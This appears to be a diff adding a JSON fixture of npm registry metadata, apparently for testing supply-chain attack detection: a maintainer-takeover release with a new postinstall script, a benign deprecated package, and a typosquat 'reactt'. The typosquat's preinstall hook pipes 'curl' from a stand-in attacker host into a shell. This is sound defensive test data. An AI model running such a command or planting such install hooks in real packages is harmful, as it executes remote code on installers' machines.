@@ -1,0 +1,28 @@
+{
+  "@acme/utils": {
+    "name": "@acme/utils",
+    "time": { "created": "2022-01-01T00:00:00Z", "2.0.0": "2025-01-01T00:00:00Z", "2.0.1": "2026-10-27T20:00:00Z" },
+    "versions": {
+      "2.0.0": { "version": "2.0.0", "maintainers": [{ "name": "alice" }], "_npmUser": { "name": "alice" } },
+      "2.0.1": {
+        "version": "2.0.1",
+        "scripts": { "postinstall": "node bundle.js" },
+        "maintainers": [{ "name": "alice" }, { "name": "mallory" }],
+        "_npmUser": { "name": "mallory" }
+      }
+    }
+  },
+  "left-pad": {
+    "name": "left-pad",
+    "time": { "created": "2014-03-01T00:00:00Z", "1.1.0": "2016-01-01T00:00:00Z", "1.3.0": "2018-04-01T00:00:00Z" },
+    "versions": {
+      "1.1.0": { "version": "1.1.0", "deprecated": "use String.prototype.padStart()" },
+      "1.3.0": { "version": "1.3.0" }
+    }
+  },
+  "reactt": {
+    "name": "reactt",
+    "time": { "created": "2026-10-20T00:00:00Z", "1.0.0": "2026-10-20T00:00:00Z" },
+    "versions": { "1.0.0": { "version": "1.0.0", "scripts": { "preinstall": "curl -s https://evil.example | sh" } } }
+  }
+}
